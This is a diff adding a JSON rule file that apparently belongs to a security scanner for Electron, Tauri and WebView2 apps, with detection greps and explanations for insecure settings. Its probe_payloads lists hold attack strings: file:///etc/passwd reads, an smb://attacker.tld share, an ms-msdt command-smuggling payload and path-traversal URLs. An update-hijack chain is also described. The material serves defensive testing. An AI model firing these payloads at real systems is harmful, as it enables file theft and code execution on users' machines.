@@ -1,0 +1,117 @@
+{
+  "category": "desktop_electron",
+  "description": "Electron / Tauri / WebView2 desktop application security patterns. Mostly static-analysis-driven (binary inspection by desktop-agent); only autoupdate_http_mitm participates in auto_probe via HTTP. Reference contexts emit grep/probe instructions in their `detect` field for operator + desktop-agent.",
+  "applies_to": ["desktop_electron", "desktop_tauri", "desktop_webview2"],
+  "contexts": {
+    "node_integration_enabled": {
+      "reference_only": true,
+      "detect": "grep -RE 'nodeIntegration\\s*:\\s*true' extracted/",
+      "severity_hint": "high",
+      "explanation": "Renderer process can require('child_process'). Any XSS in remote-loaded page becomes RCE in main process."
+    },
+    "context_isolation_disabled": {
+      "reference_only": true,
+      "detect": "grep -RE 'contextIsolation\\s*:\\s*false' extracted/ — also flag missing flag on Electron<12 (default false)",
+      "severity_hint": "high",
+      "explanation": "Preload world and renderer world share globals. Renderer prototype pollution rewrites preload functions (Discord 2020 chain)."
+    },
+    "sandbox_disabled": {
+      "reference_only": true,
+      "detect": "grep -RE 'sandbox\\s*:\\s*false' extracted/",
+      "severity_hint": "medium",
+      "explanation": "Without OS-level sandbox, V8 patch-gap bugs reach full host process privileges."
+    },
+    "preload_dangerous_exposure": {
+      "reference_only": true,
+      "detect": "grep -R 'contextBridge.exposeInMainWorld' -A 20 extracted/ | grep -E 'child_process|spawn|fs\\.|eval|new Function|ipcRenderer\\b'",
+      "severity_hint": "high",
+      "explanation": "Preload exposes dangerous primitives directly to the renderer's main world. Renderer XSS reaches native power."
+    },
+    "shell_openexternal_unfiltered": {
+      "reference_only": true,
+      "detect": "grep -R 'shell.openExternal\\|shell.openPath' -B2 -A5 extracted/ — flag callers with no scheme allowlist",
+      "probe_payloads": [
+        "javascript:alert(1)",
+        "file:///etc/passwd",
+        "data:text/html,<script>document.title='pwn'</script>",
+        "smb://attacker.tld/share",
+        "ms-msdt:/id PCWDiagnostic /skip force /param IT_RebrowseForFile=?? IT_LaunchMethod=ContextMenu IT_BrowseForFile=h$(calc)i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
+      ],
+      "severity_hint": "high",
+      "explanation": "shell.openExternal hands URL to OS handler. javascript:/file:/data:/UNC/ms-msdt: schemes execute. Rocket.Chat H1 #924151 class."
+    },
+    "ipc_handler_no_origin_check": {
+      "reference_only": true,
+      "detect": "grep -R 'ipcMain.on\\|ipcMain.handle' -A 10 extracted/ — flag handlers missing event.sender.getURL() allowlist",
+      "severity_hint": "high",
+      "explanation": "ipcMain.handle('exec', (e, cmd) => exec(cmd)) with no origin gate. Renderer XSS → main-process RCE."
+    },
+    "custom_protocol_traversal": {
+      "reference_only": true,
+      "detect": "grep -R 'protocol.register\\|setAsDefaultProtocolClient' extracted/",
+      "probe_payloads": [
+        "myapp://../../etc/passwd",
+        "myapp://?path=..\\..\\..\\Windows\\win.ini",
+        "myapp://file///C:/Windows/system.ini",
+        "myapp://%2e%2e%2fadmin"
+      ],
+      "severity_hint": "medium",
+      "explanation": "Custom URL schemes parse path inputs without traversal filter. file:// fallthrough discloses local files."
+    },
+    "electron_fuse_runasnode_enabled": {
+      "reference_only": true,
+      "detect": "npx @electron/fuses read --app <path> — flag RunAsNode=Enabled OR EnableNodeCliInspectArguments=Enabled",
+      "severity_hint": "critical",
+      "cve": "CVE-2024-23739",
+      "explanation": "RunAsNode fuse turns Electron binary into a Node interpreter for ELECTRON_RUN_AS_NODE. Combined with NodeCliInspect, attacker forks self with --inspect-brk and runs arbitrary JS as the app."
+    },
+    "electron_fuse_no_asar_integrity": {
+      "reference_only": true,
+      "detect": "npx @electron/fuses read — OnlyLoadAppFromAsar=Disabled OR EmbeddedAsarIntegrityValidation=Disabled",
+      "severity_hint": "high",
+      "explanation": "Without ASAR integrity fuses, attacker swaps app.asar (or stages malicious resource override) and the app loads it without signature check."
+    },
+    "videoframe_contextbridge_bypass": {
+      "reference_only": true,
+      "detect": "grep preload sources for 'VideoFrame' near 'exposeInMainWorld' — Electron 39<39.8 / 40<40.7 / 41<41.0-beta.8 vulnerable",
+      "cve": "CVE-2026-34780",
+      "severity_hint": "high",
+      "explanation": "Bridging a VideoFrame via contextBridge leaks the isolated world's MainWorldExecutionContext. Main-world XSS reaches isolated world."
+    },
+    "v8_patch_gap": {
+      "reference_only": true,
+      "detect": "DevTools: process.versions.electron / process.versions.chrome — cross-reference with `kev_epss_enrich` against Chrome stable. Patch lag >6 weeks = exploitable.",
+      "severity_hint": "high",
+      "explanation": "Electron lags Chrome stable. Public CVEs in V8 / Blink work against shipped Electron apps. ContextIsolation does NOT protect from memory bugs that bypass isolate."
+    },
+    "autoupdate_http_mitm": {
+      "matchers": [
+        {"type": "regex", "pattern": "(?i)\"url\"\\s*:\\s*\"http://"},
+        {"type": "header", "name": "Content-Type", "contains": "application/json"}
+      ],
+      "description": "Update manifest fetched over plaintext HTTP — MITM via match_replace to swap binary URL / hash. Squirrel.Mac / electron-updater pattern.",
+      "severity": "critical",
+      "confidence_boost": 75,
+      "variables": {"manual_chain": true},
+      "explanation": "Captured update-channel HTTP request → match_replace the manifest 'url' field to attacker host → trojan update installs on next launch."
+    },
+    "tauri_capability_overbroad": {
+      "reference_only": true,
+      "detect": "cat src-tauri/capabilities/*.json + tauri.conf.json — flag fs:allow-* without scope, shell:allow-execute without args allowlist, http:default without origin allowlist",
+      "severity_hint": "high",
+      "explanation": "Tauri v2 capability model: per-window permission grants. Missing scope on fs / shell / http capabilities = arbitrary host access from any window."
+    },
+    "webview2_host_object_exposed": {
+      "reference_only": true,
+      "detect": "grep host C#/C++ for CoreWebView2.AddHostObjectToScript — flag if remote URL navigable in WebView",
+      "severity_hint": "high",
+      "explanation": "AddHostObjectToScript exposes .NET / native objects to JS in WebView. Navigation to attacker URL reaches the host bridge."
+    },
+    "webview2_postmessage_no_origin": {
+      "reference_only": true,
+      "detect": "WebMessageReceived handler with no e.Source / e.Origin allowlist",
+      "severity_hint": "high",
+      "explanation": "WebView2 host's WebMessageReceived trusts message regardless of source origin. Foreign-origin XSS in WebView reaches host."
+    }
+  }
+}
